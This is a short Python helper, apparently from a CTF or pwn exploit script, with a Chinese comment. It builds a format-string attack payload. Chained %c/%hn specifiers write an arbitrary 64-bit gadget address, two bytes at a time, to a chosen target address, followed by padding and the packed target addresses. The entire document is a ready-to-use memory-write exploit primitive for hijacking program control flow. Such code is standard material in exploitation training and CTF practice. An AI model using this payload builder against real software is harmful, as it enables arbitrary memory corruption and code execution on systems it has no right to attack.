# 向target写入gadget, str_start为字符串的起始位置
def fmtarg(target, gadget, str_start):
    payload = b''
    write_size = 0
    for i in range(4):
        value  = ( gadget >> ( i * 16 ) ) & 0xffff
        if(value > write_size & 0xffff):
            num         =   value - ( write_size & 0xffff )
            write_size  +=  value - ( write_size & 0xffff )
        else:
            num         =   value + 0x10000 - ( write_size & 0xffff )
            write_size  +=  value + 0x10000 - ( write_size & 0xffff )
        # 0为特殊情况
        if(num == 0):
            payload += b'%' + bytes(str(str_start + 8 + i), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(num), 'utf-8') + b'c%' + bytes(str(str_start + 8 + i), 'utf-8') + b'$hn'

    payload  = payload.ljust(64, b'a')
    payload += p64(target)
    payload += p64(target + 2)
    payload += p64(target + 4)
    payload += p64(target + 6)
    return payload
